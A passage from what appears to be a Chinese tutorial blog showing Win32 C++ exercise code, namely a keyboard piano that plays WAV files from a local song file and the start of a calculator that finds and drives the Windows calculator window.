class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Data-h-数据类头文件，"><a href="#Data-h-数据类头文件，" class="headerlink" title="Data.h//数据类头文件，"></a>Data.h//数据类头文件，</h3><p>用于本地数据的读取及函数的封装</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//接收从本地读取到的字符</span></span><br><span class="line"><span class="type">char</span> <span class="type">static</span> Souce[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//判断传入的字符对应的播放音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span>;</span><br><span class="line"><span class="comment">//读取本地歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadData</span><span class="params">(HWND hwnd)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Data-cpp-数据类函数定义"><a href="#Data-cpp-数据类函数定义" class="headerlink" title="Data.cpp//数据类函数定义"></a>Data.cpp//数据类函数定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Data::Souce[<span class="number">50</span>] = &#123;&#125;;</span><br><span class="line"><span class="comment">//从本地读取歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">Data::ReadData</span><span class="params">(HWND hwnd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="comment">//如果打开成则为0</span></span><br><span class="line"><span class="type">int</span> Errno = <span class="built_in">fopen_s</span>(&amp;file, <span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Errno != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hwnd, <span class="string">L&quot;错误&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fgets</span>(Souce,<span class="number">50</span>,file);</span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断字符对应所播放的音乐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Data::If_Case</span><span class="params">(<span class="type">char</span> c_char)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (c_char)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Q.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_W.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_E.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_R.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_T.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Y.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_U.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_I.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_O.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_P.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_A.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_S.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_D.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_F.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_G.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_H.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_J.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_K.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_L.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_Z.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_X.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_C.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_V.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_B.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_N.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\Sound_M.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">800</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：计算器"><a href="#题：计算器" class="headerlink" title="题：计算器"></a>题：计算器</h2><p>描述：自己编写一个计算器能够控制windows系统中的计算器进行操作</p><h3 id="main-cpp-主函数-1"><a href="#main-cpp-主函数-1" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;my_calc&quot;</span>;</span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line">wc.hbrBackground =(HBRUSH)COLOR_APPWORKSPACE;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;my_calc&quot;</span>,<span class="string">L&quot;计算器&quot;</span>,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,<span class="number">0</span>,<span class="number">390</span>,<span class="number">600</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,hInstance,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_NORMAL);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line">MSG msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//回调函数消息处理</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND calc = <span class="built_in">FindWindow</span>(<span class="string">L&quot;CalcFrame&quot;</span>, <span class="string">L&quot;计算器&quot;</span>);</span><br><span class="line"><span class="type">static</span> HINSTANCE hInstance = (HINSTANCE)<span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//HWND calc=FindWindow(NULL,L&quot;计算器&quot; );</span></span><br><span class="line"><span class="comment">//HWND calc = (HWND)0x00140596;</span></span><br><span class="line"><span class="keyword">switch</span> (msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//SendMessage(calc, WM_COMMAND, MAKEWPARAM(0x83, BN_CLICKED), NULL);</span></span><br><span class="line"><span class="comment">//对话框</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;edit&quot;</span>, <span class="string">L&quot; &quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER, <span class="number">10</span>, <span class="number">10</span>, <span class="number">350</span>, <span class="number">180</span>, hwnd, (HMENU)<span class="number">0x1011</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//按键</span></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;清空&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1000</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;退格&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">200</span>, <span class="number">170</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1017</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;1&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1001</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;2&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1002</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;3&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1003</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;4&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1004</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;5&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1005</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;6&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">100</span>, <span class="number">380</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1006</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;7&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">260</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1007</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;8&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">190</span>, <span class="number">320</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x1008</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;9&quot;</span>, WS_CHILD | WS_VISIBLE, 